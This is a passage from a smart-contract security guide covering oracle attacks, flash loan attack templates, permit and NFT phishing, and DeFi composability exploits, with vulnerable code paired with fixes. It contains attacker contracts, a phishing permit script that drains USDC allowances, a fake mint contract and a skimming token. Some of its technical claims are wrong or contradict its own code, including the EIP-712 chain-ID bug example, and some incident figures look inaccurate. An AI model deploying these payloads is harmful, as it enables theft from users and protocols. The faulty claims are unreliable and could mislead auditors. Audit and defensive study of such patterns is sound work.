    IUniswapV3Pool public immutable pool;
    uint32 public constant WINDOW = 1800;   // 30-min TWAP

    function getSqrtTwapX96() external view returns (uint160) {
        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = WINDOW;
        secondsAgos[1] = 0;
        (int56[] memory tickCumulatives, ) = pool.observe(secondsAgos);
        int56 tickCumDelta = tickCumulatives[1] - tickCumulatives[0];
        int24 tick = int24(tickCumDelta / int56(uint56(WINDOW)));
        return TickMath.getSqrtRatioAtTick(tick);
    }
}
```

### 19.3 Multi-Oracle Divergence Attack

A protocol that takes the median of three oracles is safe against one going bad. A protocol that takes the *minimum* of three oracles is exploitable if an attacker can manipulate the cheapest one.

```solidity
// Vulnerable: takes the minimum — an attacker compromises the cheapest oracle.
contract MinOracle {
    AggregatorV3Interface public feed1;   // Chainlink
    AggregatorV3Interface public feed2;   // Uniswap V3 TWAP
    AggregatorV3Interface public feed3;   // custom off-chain API

    function getPrice() external view returns (uint256) {
        uint256 p1 = _read(feed1);
        uint256 p2 = _read(feed2);
        uint256 p3 = _read(feed3);
        return Math.min(Math.min(p1, p2), p3);   // BUG: cheapest oracle wins
    }
}

// Fix: median + deviation check.
function getPrice() external view returns (uint256) {
    uint256[3] memory prices = [_read(feed1), _read(feed2), _read(feed3)];
    uint256 median = _medianOf3(prices);
    for (uint256 i = 0; i < 3; i++) {
        // Reject any oracle that deviates >5% from median
        require(_within(prices[i], median, 0.05e18), "oracle deviation");
    }
    return median;
}
```

### 19.4 Custom Oracle Contract Exploitation

A custom oracle that updates from an off-chain keeper is only as safe as the keeper. A common pattern: keeper submits a price, oracle stores it, lending protocol reads it. If the keeper key is compromised, the attacker controls the protocol's collateral ratios.

```solidity
// Vulnerable: single-signer keeper with no deviation check.
contract CustomOracle {
    address public keeper;
    uint256 public price;

    function setPrice(uint256 newPrice) external {
        require(msg.sender == keeper, "not keeper");
        // BUG: no deviation bound — keeper can set any price
        price = newPrice;
    }
}

// Fix: deviation bound + multisig keeper.
function setPrice(uint256 newPrice) external {
    require(msg.sender == multisigKeeper, "not keeper");
    require(_within(newPrice, price, 0.10e18), "max 10% deviation per update");
    price = newPrice;
}
```

### 19.5 Read-only Reentrancy via Oracle Callback

A growing attack vector: an oracle that pulls reserves during an external call (e.g., Uniswap V3 `slot0` during a swap callback). The protocol reads the oracle's "current" value, but the value is mid-state.

```solidity
// Vulnerable: reads oracle mid-callback during a swap.
contract BuggyLending {
    IUniswapV3Pool public immutable pool;

    function getCollateralValue(address who) public view returns (uint256) {
        (uint160 sqrtPriceX96, , , , , , ) = pool.slot0();
        // BUG: if this is called inside pool.swap's callback, slot0 is mid-state
        return (collateral[who] * uint256(sqrtPriceX96) * uint256(sqrtPriceX96)) >> (96 * 2);
    }
}

// Defense: reentrancy lock on the lending contract's view functions, or
// snapshot the oracle price before entering external calls.
```

> **See also**: `skills/blockchain-web3/guides/blockchain-web3-defi-reentrancy-deep.md` for a taxonomy of read-only reentrancy patterns and detection methodology.

---

## 20. Flash Loan Attack Payloads

### 20.1 Single-Asset Flash Loan (Aave V3 Pattern)

```solidity
interface IPool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFlashSimpleReceiver {
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

contract AaveFlashAttacker is IFlashSimpleReceiver {
    IPool public constant AAVE_POOL = IPool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    address public victim;

    function attack(address asset, uint256 amount) external {
        AAVE_POOL.flashLoanSimple(address(this), asset, amount, "", 0);
    }

    function executeOperation(
        address asset, uint256 amount, uint256 premium, address, bytes calldata
    ) external override returns (bool) {
        // ── exploit window opens ──
        _manipulateOracle(asset, amount);
        _exploitVictim();
        _reverseOracle(asset, amount);
        // ── exploit window closes ──

        IERC20(asset).approve(address(AAVE_POOL), amount + premium);
        return true;
    }

    function _manipulateOracle(address asset, uint256 amount) internal { /* dump into pair */ }
    function _exploitVictim() internal { /* borrow against inflated collateral */ }
    function _reverseOracle(address asset, uint256 amount) internal { /* sell back */ }
}
```

### 20.2 dYdX-Style Flash Loan (No-Fee, Call-Back Pattern)

dYdX popularized flash loans before Aave: an `ISoloMargin` operation that requires balance to be returned in the same transaction. The pattern is still used in some MEV bundles.

```solidity
interface ISoloMargin {
    function operate(uint256 marketId, Types.ActionArgs[] calldata actions) external;
}

contract DydxFlashAttacker {
    ISoloMargin public constant SOLO = ISoloMargin(0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e);

    function flashBorrow(uint256 amount) external {
        // 1. Withdraw from market 0 (WETH)
        // 2. Call our callback
        // 3. Deposit back to market 0 (+1 wei for "interest")
        Types.ActionArgs[] memory actions = new Types.ActionArgs[](3);
        actions[0] = _encodeWithdraw(amount, 0);
        actions[1] = _encodeCall(address(this), abi.encodeWithSignature("callback()"));
        actions[2] = _encodeDeposit(amount + 1, 0);
        SOLO.operate(0, actions);
    }

    function callback() external {
        // exploit logic here
    }
}
```

### 20.3 Batched Flash Loan Routing (Multi-Source)

A sophisticated attacker routes a flash loan across multiple sources in a single tx, combining Aave + dYdX + Balancer to bypass per-source limits.

```solidity
contract BatchedFlashRouter is IFlashSimpleReceiver, IFlashLoanRecipient {
    function attack(uint256 totalNeeded) external {
        uint256 aaveShare = totalNeeded * 60 / 100;
        uint256 balShare  = totalNeeded * 30 / 100;
        uint256 dydxShare = totalNeeded - aaveShare - balShare;

        // Sequence: Aave → Balancer → dYdX (each layer funds the next)
        AAVE_POOL.flashLoanSimple(address(this), WETH, aaveShare, "", 0);
        // Aave callback triggers Balancer flash, which triggers dYdX flash.
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address, bytes calldata)
        external returns (bool) {
        // Balancer + dYdX cascades happen here, then exploit logic.
        IERC20(asset).approve(address(AAVE_POOL), amount + premium);
        return true;
    }
}
```

### 20.4 Atomic Price Cascade (Cross-Protocol)

The Cream Finance incident (Oct 2021, $130M) cascaded a flash loan through: Aave (borrow) → Cream (deposit as collateral) → Yearn (use cyToken as collateral elsewhere) → exploit a flagrantly overvalued cyToken.

```solidity
contract CreamCascadeAttacker {
    function attack() external {
        // Step 1: Flash-borrow 500 WETH from Aave.
        // Step 2: Deposit WETH into Cream → receive cyWETH at 1:1.
        // Step 3: Use cyWETH as collateral on a dependent C-RE that prices cyWETH via
        //         the underlying Cream balance (which was just inflated).
        // Step 4: Borrow against the inflated collateral.
        // Step 5: Reverse: withdraw cyWETH, redeem for WETH, repay Aave.
    }
}
```

### 20.5 Single-Block Rebalancing (Beanstalk-Style)

Beanstalk's April 2022 incident ($182M) used a single-block flash loan to: (1) borrow $1B from Aave, (2) use it to vote on a malicious BIP, (3) the BIP transferred all stablecoin reserves to the attacker — all in the same block as the original loan.

```solidity
contract BeanstalkAttacker {
    function attack() external {
        // 1. Flash-borrow 1B from Aave
        // 2. Convert to Bean (Beanstalk's stablecoin)
        // 3. Stake Bean to vote on a BIP the attacker pre-deployed
        // 4. BIP executes: transfers all Beanstalk reserves to attacker
        // 5. Repay Aave flash loan
        IPool(AAVE).flashLoanSimple(address(this), STABLE, 1_000_000_000e18, "", 0);
    }

    function executeOperation(...) external returns (bool) {
        uint256 beans = _swapStableForBean(amount);
        IBeanstalk(BEANSTALK).vote(bipId);
        // BIP execution transfers reserves to this contract
        // Repay
        IERC20(STABLE).approve(AAVE, amount + premium);
        return true;
    }
}
```

### 20.6 Flash Loan — Incident Reference

| Incident | Date | Loss | Source | Pattern |
|----------|------|------|--------|---------|
| bZx (twice) | Feb 2020 | $0.95M | Aave, Kyber/Uniswap | Oracle manipulation (sUSD spot) |
| PancakeHunny | Oct 2021 | — | PancakeSwap | Inflation + oracle |
| Cream Finance | Oct 2021 | $130M | Aave | Cross-protocol collateral cascade |
| Beanstalk | Apr 2022 | $182M | Aave | Governance flash-vote |
| EGD Finance | Aug 2022 | $36M | Uniswap V3 | Reward-harvest oracle manipulation |
| Euler Finance | Mar 2023 | $197M | — | Self-listing + donational rebasing |

> **See also**: `skills/blockchain-web3/guides/blockchain-web3-defi-reentrancy-deep.md` for the Euler deep dive and audit methodology.

---

## 21. NFT Minting / Permit Payloads

### 21.1 EIP-2612 permit (Gasless Approval) Phishing

EIP-2612 introduces a `permit(owner, spender, value, deadline, v, r, s)` function on ERC-20 tokens: the holder signs an off-chain EIP-712 typed-data message authorizing an allowance, and any party may submit it on-chain. Phishing sites trick users into signing a permit for an attacker-controlled spender.

```typescript
// ethers.js — what a phishing dApp sends to the wallet
import { ethers } from "ethers";
const provider = new ethers.BrowserProvider(window.ethereum);

const domain = {
  name: "USDC",
  version: "2",
  chainId: 1,
  verifyingContract: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
};

const types = {
  Permit: [
    { name: "owner", type: "address" },
    { name: "spender", type: "address" },
    { name: "value", type: "uint256" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" },
  ],
};

const message = {
  owner: victimAddress,
  spender: attackerAddress,                                      // ← what the user doesn't read
  value: ethers.MaxUint256,                                      // ← infinite allowance
  nonce: 0,
  deadline: ethers.MaxUint256,                                   // ← never expires
};

// User signs, then attacker submits on-chain at their leisure:
const sig = await wallet.signTypedData(domain, types, message);
const { r, s, v } = ethers.Signature.from(sig);
await usdc.permit(victimAddress, attackerAddress, ethers.MaxUint256, ethers.MaxUint256, v, r, s);
```

**Defense (from the wallet/dApp side)**:

- Wallets must show spender address + allowance prominently (EIP-4361 Sign-In with Ethereum)
- Contracts should integrate with Revoke.cash to alert users about stale allowances
- Protocols should cap allowance to a per-action amount, not `MaxUint256`

### 21.2 ERC-4494 NFT permit

ERC-4494 brings EIP-2612-style permit to ERC-721. A phishing site tricks the user into signing a permit that lets the attacker take an NFT via `permit` + `transferFrom`.

```solidity
interface IERC4494 {
    function permit(address spender, uint256 tokenId, uint256 deadline, bytes calldata sig) external;
}

// Attacker flow:
// 1. Phish user into signing ERC-4494 permit for tokenId X
// 2. Call permit(attacker, X, deadline, sig) on-chain
// 3. Call transferFrom(victim, attacker, X)
// → NFT is gone, no transfer of ETH needed, no approve() on-chain trail
```

### 21.3 Signature Replay Across Chains

EIP-712 typed data does NOT bind to chain ID by default. A signed permit on Ethereum mainnet can be replayed on a fork (e.g., Polygon) if the verifying contract is deployed at the same address.

```solidity
contract VulnerablePermit {
    mapping(address => uint256) public nonces;

    function permit(address owner, address spender, uint256 value, uint256 deadline,
        uint8 v, bytes32 r, bytes32 s) external {
        require(block.timestamp <= deadline, "expired");

        // BUG: domain separator does not include chainId binding
        bytes32 hash = keccak256(abi.encodePacked(
            "\x19\x01",
            _domainSeparatorV4(),
            keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))
        ));

        address signer = ecrecover(hash, v, r, s);
        require(signer == owner, "bad sig");
        _approve(spender, value);
    }

    function _domainSeparatorV4() internal view returns (bytes32) {
        // BUG: uses block.chainid once at construction (cached), or not at all
        return keccak256(abi.encode(
            EIP712_DOMAIN_TYPEHASH,
            keccak256("MyToken"),
            keccak256("1"),
            block.chainid,                 // ← cached at construction, never re-evaluated
            address(this)
        ));
    }
}

// Fix: re-evaluate block.chainid on every call; if it differs from cached,
// recompute the separator with the new chainId.
function _domainSeparatorV4() internal view returns (bytes32) {
    if (block.chainid == CACHED_CHAIN_ID) return CACHED_DOMAIN_SEPARATOR;
    return _buildDomainSeparator(block.chainid);
}
```

### 21.4 Seaport Protocol Abuse Patterns

OpenSea's Seaport protocol allows complex order structures (criteria-based, partial fills, tips). Abuse patterns include:

- **Phantom criteria**: orders that look like NFT X but fulfill to attacker-controlled NFT Y
- **Conduit key reuse**: a compromised conduit key lets the attacker fulfill any order using that conduit
- **Tip injection**: a malicious fulfiller adds a tip to themselves inside a legitimate-looking order

```solidity
// Seaport "tip" abuse — attacker front-ends the order and adds an extra consideration.
contract SeaportTipAbuser {
    function fulfillOrderWithTip(Order calldata order, uint256 tipAmount) external {
        // Add a "consideration" item that pays the abuser
        ConsiderationItem[] memory considerations = new ConsiderationItem[](order.considerations.length + 1);
        for (uint256 i = 0; i < order.considerations.length; i++) {
            considerations[i] = order.considerations[i];
        }
        considerations[order.considerations.length] = ConsiderationItem({
            itemType: 1,  // ERC20
            token: WETH,
            identifier: 0,
            startAmount: tipAmount,
            endAmount: tipAmount,
            recipient: payable(address(this))   // abuser
        });

        // Submit to Seaport — the user's signature may still verify, since
        // order hash did not bind to the considerations array length.
        ISeaport(SEAPORT).fulfillOrder(order, considerations, address(0));
    }
}
```

**Audit checklist for Seaport integrations**:

- Validate the order hash binds to the *full* considerations array
- Reject orders with tips to unknown recipients
- Use the protocol's own zone for verifier checks (do not roll your own)
- Re-check `block.timestamp` against `startTime`/`endTime` after fulfillment

### 21.5 NFT Mint Phishing — Direct Mint via Spoofed Project

Many projects deploy a "shadow mint" contract that impersonates the real project's mint. The shadow has the same `name()` / `symbol()` but a different address — once minted, the NFT has no value.

```solidity
// Phishing contract — pretends to be CoolCats (or any popular collection)
contract FakeCoolCats {
    string public name = "Cool Cats";
    string public symbol = "COOL";
    uint256 public mintPrice = 0.5 ether;

    function mint(uint256 n) external payable {
        require(msg.value == mintPrice * n);
        // Mint worthless NFTs to victim — victim cannot distinguish from real contract
        // except by checking the address carefully before signing.
        for (uint256 i = 0; i < n; i++) {
            _mint(msg.sender);
        }
    }
}
```

**Defense**: frontends should resolve ENS names + verify contract address against the project's official website (which itself must be verified via DNS + social proof).

---

## 22. DeFi Composability Attack Payloads

### 22.1 Vault Share Inflation (Multi-Layer)

A yield aggregator that deposits into an underlying ERC-4626 vault inherits the underlying vault's inflation attack surface. The first-depositor attack can be triggered on the aggregator layer even if the underlying vault is patched.

```solidity
contract YieldAggregator {
    IERC4626 public underlyingVault;        // patched, has dead shares
    mapping(address => uint256) public agShares;

    // BUG: aggregator has its own share math with no dead shares.
    function deposit(uint256 assets) external returns (uint256) {
        uint256 vSharesBefore = underlyingVault.totalSupply();
        uint256 received = underlyingVault.deposit(assets, address(this));
        uint256 vSharesAfter = underlyingVault.totalSupply();
        uint256 delta = vSharesAfter - vSharesBefore;

        // Aggregator shares = delta (no dead shares on this layer!)
        uint256 agMint = delta == 0 ? 1 : delta;
        agShares[msg.sender] += agMint;
        return agMint;
    }
}

// Attacker: inflate agShares by sandwiching a victim's deposit through the
// aggregator's underlying vault, capturing the victim's assets.
```

### 22.2 Reentrancy Across Composability Layers

A reentrancy guard on protocol A does NOT protect against reentering protocol B while inside A's call. Each protocol must have its own guard; cross-protocol reentrancy is the gap.

```solidity
contract ProtocolA is ReentrancyGuard {
    IProtocolB public immutable b;

    function deposit(uint256 amount) external nonReentrant {
        // State updates, then call into B
        _creditUser(msg.sender, amount);
        b.onDeposit(amount);
        // Inside b.onDeposit, attacker's hook fires and calls ProtocolA.withdraw()
        // — which is locked by this nonReentrant. ✓
        // But if the attacker instead calls ProtocolC (which also reads A's state),
        // C has no reentrancy guard and acts on stale A state.
    }
}

contract ProtocolC {                       // no reentrancy guard
    IProtocolA public immutable a;

    function snapshot(address who) external view returns (uint256) {
        // Reads mid-deposit state — inflated by the in-flight credit.
        return a.balanceOf(who);
    }
}
```

**Defense**: read-only reentrancy guards — a transient bool set during external calls, checked by view functions.

```solidity
contract ProtocolA {
    uint256 private _locked = 1;
    uint256 private _viewLocked = 1;

    modifier nonReentrant() { require(_locked == 1); _locked = 2; _; _locked = 1; }
    modifier nonReadReentrant() { require(_viewLocked == 1); _viewLocked = 2; _; _viewLocked = 1; }

    function deposit(uint256 amount) external nonReentrant {
        _viewLocked = 2;       // also lock reads
        _creditUser(msg.sender, amount);
        b.onDeposit(amount);
        _viewLocked = 1;
    }

    function balanceOf(address who) external nonReadReentrant returns (uint256) {
        return _balances[who];
    }
}
```

### 22.3 Multi-Hop Arbitrage with Malicious Intermediate Tokens

A DEX aggregator that swaps token A → B → C inherits the price impact of B's pool. An attacker can deploy a malicious B that deflates the swap mid-route.

```solidity
contract MaliciousIntermediate {
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    // When the aggregator calls transfer, skim 5% off the top into a stealth wallet.
    function transfer(address to, uint256 amount) external returns (bool) {
        uint256 fee = amount * 5 / 100;
        balanceOf[msg.sender] -= amount;
        balanceOf[STEALTH_WALLET] += fee;
        balanceOf[to] += amount - fee;
        return true;
    }

    // Then the aggregator's price quote (which measured full amount) under-delivers.
}
```

**Defense**: protocols should whitelist input tokens; or use the balance-delta pattern at every hop to measure actual receipts.

### 22.4 Interest-Rate Manipulation via Flash Loan

A money market with a utilization-based interest rate can be pushed to extreme rates by a flash loan that artificially inflates borrows for one block.

```solidity
contract BuggyInterestRate {
    uint256 public totalBorrows;
    uint256 public totalDeposits;

    function utilization() public view returns (uint256) {
        return (totalBorrows * 1e18) / totalDeposits;
    }

    function borrowRate() external view returns (uint256) {
        uint256 u = utilization();
        if (u < 0.8e18) return 0.05e18 + u / 5;
        // Above 80%, rate jumps to 50% — kink model
        return 0.5e18;
    }
}

// Attacker: flash-borrow to push utilization > 80% in the same block that an
// existing borrower's interest accrues — they are charged 50% APY for the
// instant the loan was open, then the rate returns to normal.
```

### 22.5 Cross-Protocol Share-Price Manipulation

A yield token (yToken) is priced as `totalAssets / totalShares`. If an attacker can briefly inflate `totalAssets` (via donation) while a dependent protocol reads the price, they extract value from the dependent.

```solidity
contract PriceConsumer {
    IYieldToken public immutable yToken;

    function price() external view returns (uint256) {
        return yToken.totalAssets() / yToken.totalShares();   // manipulable
    }
}

// Attack:
// 1. Donate 1M asset to yToken via direct transfer
// 2. PriceConsumer reads yToken price → inflated 100x
// 3. Borrow against the inflated price on the dependent protocol
// 4. Repay + reverse (donation cannot be reversed — but the borrower profited)
```

**Defense**: every dependent protocol must snapshot the yToken price (or block.timestamp) before reading it, and reject mid-block reads.

---

**Related files**: `SKILL.md`, `test-cases.md`, `guides/smart-contract-audit-playbook.md`, `guides/defi-exploit-testing-playbook.md`, `guides/blockchain-web3-defi-reentrancy-deep.md`
**Slither upstream**: [github.com/crytic/slither](https://github.com/crytic/slither)
**Foundry book**: [book.getfoundry.sh](https://book.getfoundry.sh)
**SWC Registry**: [swcregistry.io](https://swcregistry.io)
